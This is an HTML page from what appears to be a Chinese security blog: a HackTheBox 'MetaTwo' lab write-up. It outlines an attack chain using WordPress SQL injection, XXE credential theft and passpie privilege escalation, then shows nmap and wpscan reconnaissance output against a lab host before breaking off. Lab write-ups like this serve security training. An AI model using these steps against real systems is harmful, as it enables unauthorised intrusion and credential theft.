@@ -1,0 +1,873 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：wpscan、aggressive、CVE-2022-0739、CVE-2021-29447、wp-settings.php、send_email.php、passpie、gpg2john、john">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MetaTwo-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/09/23/MetaTwo-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：wpscan、aggressive、CVE-2022-0739、CVE-2021-29447、wp-settings.php、send_email.php、passpie、gpg2john、john">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/11.png">
+<meta property="article:published_time" content="2024-09-23T15:50:55.000Z">
+<meta property="article:modified_time" content="2025-02-25T07:26:27.801Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/MetaTwo-htb-writeup/1.png">
+  
+  
+  
+  <title>MetaTwo-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
+                    
+                    <span>SQLMap命令生成器</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/cvssjs/" target="_self">
+                    
+                    <span>CVSSv3.1 漏洞评分</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MetaTwo-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-23 23:50" pubdate>
+          2024年9月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          37k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          311 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">MetaTwo-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：wpscan、aggressive、CVE-2022-0739、CVE-2021-29447、wp-settings.php、send_email.php、passpie、gpg2john、john</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://cybersn0w.notion.site/MetaTwo-HackTheBox-d18cd466c10a4908bee34b6361b03ee6</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/04/29/htb-metatwo.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
+<p><code>关于 MetaTwo</code><br><code>MetaTwo 是一台简单的 Linux 机器，带有一个运行 Wordpress 的网站，该网站使用了一个易受未经身份验证的 SQL 注入攻击的插件 ([CVE-2022-0739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739))。该插件可被利用来泄露 Wordpress 用户的密码哈希，破解该密码哈希可获得 Wordpress 用户“manager”的密码。正在使用的 Wordpress 版本易受媒体库中的 XXE 漏洞 ([CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)) 的攻击，可利用该漏洞获取 FTP 服务器的凭据。FTP 服务器上的文件会泄露用户“jnelson”的 SSH 凭据。为了提升权限，可以利用远程主机上的“passpie”实用程序来获取“root”用户的密码。</code></p>
+<p>2、获取下靶机开放端口情况</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- -Pn <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span> --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">10000</span><br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">23</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.42</span>s latency).<br>Not shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp <span class="hljs-keyword">open</span>  ftp<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">20.04</span> seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs wren">──(<span class="hljs-variable">kali</span>㉿<span class="hljs-variable">offsec</span>)<span class="hljs-operator">-</span>[<span class="hljs-operator">~</span>/<span class="hljs-title class_">Desktop</span>]<br>└─$ <span class="hljs-variable">sudo</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">p21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span> <span class="hljs-operator">-</span><span class="hljs-variable">sV</span> <span class="hljs-operator">-</span><span class="hljs-variable">sC</span> <span class="hljs-operator">-</span><span class="hljs-title class_">Pn</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-variable">min</span><span class="hljs-operator">-</span><span class="hljs-variable">rate</span><span class="hljs-operator">=</span><span class="hljs-number">10000</span><br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span>SVN ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-09-23 17:41 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.38</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>   <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span> <span class="hljs-variable">VERSION</span><br><span class="hljs-number">21</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ftp?</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GenericLines</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Pro</span>FTPD <span class="hljs-title class_">Server</span> (<span class="hljs-title class_">Debian</span>) [::<span class="hljs-variable">ffff</span>:<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>]<br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Invalid</span> <span class="hljs-variable">command</span>: <span class="hljs-variable">try</span> <span class="hljs-variable">being</span> <span class="hljs-variable">more</span> <span class="hljs-variable">creative</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-title class_">Invalid</span> <span class="hljs-variable">command</span>: <span class="hljs-variable">try</span> <span class="hljs-variable">being</span> <span class="hljs-variable">more</span> <span class="hljs-variable">creative</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>     <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.4</span>p1 <span class="hljs-title class_">Debian</span> <span class="hljs-number">5</span><span class="hljs-operator">+</span><span class="hljs-title function_">deb11u1</span> (<span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">ssh</span><span class="hljs-operator">-</span><span class="hljs-variable">hostkey</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-number">3072</span> <span class="hljs-variable">c4</span>:<span class="hljs-variable">b4</span>:<span class="hljs-number">46</span>:<span class="hljs-number">17</span>:<span class="hljs-variable">d2</span>:<span class="hljs-number">10</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">8</span>f:<span class="hljs-variable">ec</span>:<span class="hljs-number">1</span>d:<span class="hljs-variable">c9</span>:<span class="hljs-number">27</span>:<span class="hljs-variable">fe</span>:<span class="hljs-variable">cd</span>:<span class="hljs-number">79</span>:<span class="hljs-title function_">ee</span> (<span class="hljs-variable">RSA</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">2</span>a:<span class="hljs-variable">ea</span>:<span class="hljs-number">2</span>f:<span class="hljs-variable">cb</span>:<span class="hljs-number">23</span>:<span class="hljs-variable">e8</span>:<span class="hljs-variable">c5</span>:<span class="hljs-number">29</span>:<span class="hljs-number">40</span>:<span class="hljs-number">9</span>c:<span class="hljs-variable">ab</span>:<span class="hljs-number">86</span>:<span class="hljs-number">6</span>d:<span class="hljs-variable">cd</span>:<span class="hljs-number">44</span>:<span class="hljs-number">11</span> (<span class="hljs-variable">ECDSA</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-number">256</span> <span class="hljs-variable">fd</span>:<span class="hljs-number">78</span>:<span class="hljs-variable">c0</span>:<span class="hljs-variable">b0</span>:<span class="hljs-variable">e2</span>:<span class="hljs-number">20</span>:<span class="hljs-number">16</span>:<span class="hljs-variable">fa</span>:<span class="hljs-number">05</span>:<span class="hljs-number">0</span>d:<span class="hljs-variable">eb</span>:<span class="hljs-variable">d8</span>:<span class="hljs-number">3</span>f:<span class="hljs-number">12</span>:<span class="hljs-variable">a4</span>:<span class="hljs-title function_">ab</span> (<span class="hljs-variable">ED25519</span>)<br><span class="hljs-number">80</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span>    <span class="hljs-variable">nginx</span> <span class="hljs-number">1.18</span><span class="hljs-number">.0</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Did</span> <span class="hljs-variable">not</span> <span class="hljs-variable">follow</span> <span class="hljs-variable">redirect</span> <span class="hljs-variable">to</span> <span class="hljs-variable">http</span>:<span class="hljs-comment">//metapress.htb/</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">server</span><span class="hljs-operator">-</span><span class="hljs-variable">header</span>: <span class="hljs-variable">nginx</span>/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span><br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>21<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.94</span>SVN<span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">9</span>/<span class="hljs-number">23</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">66</span>F137E3<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">aarch64</span><span class="hljs-operator">-</span><span class="hljs-variable">unknown</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">g</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">nu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">GenericLines</span>,<span class="hljs-number">8</span>F,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>ProFTPD<span class="hljs-char escape_">\x20</span>Server<span class="hljs-char escape_">\x20</span>\(Debian\)<span class="hljs-char escape_">\x20</span>\[::fff</span><br><span class="hljs-string">SF:f:10\.10\.11\.186\]<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>500<span class="hljs-char escape_">\x20</span>Invalid<span class="hljs-char escape_">\x20</span>command:<span class="hljs-char escape_">\x20</span>try<span class="hljs-char escape_">\x20</span>being<span class="hljs-char escape_">\x20</span>mo</span><br><span class="hljs-string">SF:re<span class="hljs-char escape_">\x20</span>creative<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>500<span class="hljs-char escape_">\x20</span>Invalid<span class="hljs-char escape_">\x20</span>command:<span class="hljs-char escape_">\x20</span>try<span class="hljs-char escape_">\x20</span>being<span class="hljs-char escape_">\x20</span>more\x2</span><br><span class="hljs-string">SF:0creative<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">240.17</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>3、对发现的域名地址本地绑定下hosts</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.186 metapress.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10.11.186</span> metapress.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、查看下这个域名的网站内容信息</p>
+<p><code>http://metapress.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、这里发现该网站使用了 wordpress 框架，故使用专用扫描器进行漏洞扫描</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ wpscan --url http://metapress.htb/<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<span class="hljs-string"></span><br><span class="hljs-string">          \ \  /\  / /</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__) </span>|<span class="hljs-string"> (___   ___  __ _ _ __ ®</span><br><span class="hljs-string">           \ \/  \/ / </span>|<span class="hljs-string">  ___/ \___ \ / __</span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> &#x27;_ \</span><br><span class="hljs-string">            \  /\  /  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">     ____) </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>             \/  \/   |<span class="hljs-string">_</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_____/ \___</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.25<br>                               <br>       <span class="hljs-meta">@_WPScan_,</span> <span class="hljs-meta">@ethicalhack3r,</span> <span class="hljs-meta">@erwan_lr,</span> <span class="hljs-meta">@firefart</span><br>_______________________________________________________________<br><br>[i] Updating the Database ...<br>[i] Update completed.<br><br>[+] URL: http://metapress.htb/ [10.10.11.186]<br>[+] Started: Mon Sep 23 17:48:29 2024<br><br>Interesting Finding(s):<br><br>[+] Headers<br> |<span class="hljs-string"> Interesting Entries:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - Server: nginx/1.18.0</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - X-Powered-By: PHP/8.0.24</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] robots.txt 